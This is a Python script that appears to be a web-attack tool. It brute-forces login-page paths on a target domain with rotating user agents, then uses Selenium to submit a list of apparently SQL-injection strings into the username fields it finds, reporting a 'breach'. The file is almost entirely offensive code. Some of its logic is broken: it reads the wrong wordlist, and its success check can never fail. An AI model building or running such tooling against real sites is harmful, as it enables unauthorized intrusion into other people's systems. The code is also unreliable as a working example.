import asyncio
import aiohttp
import selenium
from fake_useragent import UserAgent
from flask import Flask, request, render_template
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as ec
from selenium.webdriver.support.wait import WebDriverWait

ua = UserAgent()
app = Flask(__name__, template_folder='templates')


class ColorPalette:
    G = '\033[92m'  # green
    Y = '\033[93m'  # yellow
    B = '\033[94m'  # blue
    R = '\033[91m'  # red
    W = '\033[0m'  # white
    M = '\u001b[35m'  # magenta


def read_wordlist():
    with open("login_wordlist.txt") as text_file:
        wordlist = text_file.read()
        splitted_wordlist = wordlist.strip().split("\n")
    return splitted_wordlist


def read_sqllist():
    with open("login_wordlist.txt") as text_file:
        sqllist = text_file.read()
        splitted_sqllist = sqllist.strip().split("\n")
    return splitted_sqllist


def login_check(fu):
    # go to log in webpage
    driver = webdriver.Edge()
    driver.get(fu)


    try:
        username = driver.find_element(By.ID, "username")
        password = driver.find_element(By.ID, "password")
        button = driver.find_element(By.XPATH, "button")
    except selenium.common.exceptions.NoSuchElementException:
        try:
            username = driver.find_element(By.ID, "email")
            password = driver.find_element(By.ID, "password")
            button = driver.find_element(By.XPATH, "button")
        except selenium.common.exceptions.NoSuchElementException:
            try:
                username = driver.find_element(By.ID, "username")
                password = driver.find_element(By.ID, "password")
                button = driver.find_element(By.XPATH, "submit")
            except selenium.common.exceptions.NoSuchElementException:
                try:
                    username = driver.find_element(By.ID, "email")
                    password = driver.find_element(By.ID, "password")
                    button = driver.find_element(By.XPATH, "submit")
                except selenium.common.exceptions.NoSuchElementException:
                    return

    # retrieve list of passwords (the last password is my real password
    sqllist = read_sqllist()
    y = ""
    # loop through password options
    for x in sqllist:
        username.send_keys(x)
        password.send_keys("password")
        driver.execute_script("arguments[0].click();", button)
        if ec.presence_of_element_located((By.ID, "username")):
            username.clear()
            password.clear()
        else:
            print("breach achieved!")
            break


    # tell driver to wait until webpage gives an alert (it never will), this is so progress can be observed
    WebDriverWait(driver, 200).until(ec.alert_is_present(), "done")


word_list = read_wordlist()
founded_url = []


async def search_login(session, url, word):
    try:
        async with session.get(url + word, allow_redirects=False, verify_ssl=False) as response:
            status_code = response.status
            if status_code == 200:
                print(f"{url}{word} {ColorPalette.M} --> {ColorPalette.G} Boom! {ColorPalette.W}")
                founded_url.append(url + word)
            elif status_code == 403:
                print(f"{url}{word} {ColorPalette.M} --> {ColorPalette.B} Forbidden! {ColorPalette.W}")

            elif status_code == 404:
                print(f"{url}{word} {ColorPalette.M} --> {ColorPalette.R} Not Found! {ColorPalette.W}")

            elif status_code in [302, 301]:
                print(f"{url}{word} {ColorPalette.M} --> {ColorPalette.Y} Redirecting! {ColorPalette.W}")

            else:
                print(f"{ColorPalette.B} {url}{word} {ColorPalette.W}  --> {status_code} ")
    except aiohttp.ClientConnectorError:
        pass

    return founded_url


@app.route("/", methods=["POST", "GET"])
async def home():
    if request.method == "POST":
        url = request.form["nm"]
        if url[0:3] == "www":
            url_string = "https://" + url
        elif url[0:8] == "https://":
            url_string = url
        else:
            url_string = "https://www." + url

        tasks = []
        url = url_string

        if not url.endswith('/'):
            url += '/'

        headers = {
            'User-Agent': ua.random
        }

        async with aiohttp.ClientSession(headers=headers) as session:
            for word in word_list:
                tasks.append(search_login(session=session, word=word, url=url))
            await asyncio.gather(*tasks)

        print(f"Found {len(founded_url)}")

        if founded_url:
            for fu in founded_url:
                login_check(fu)

    return render_template("index.html")


if __name__ == "__main__":
    app.run(port=8000)
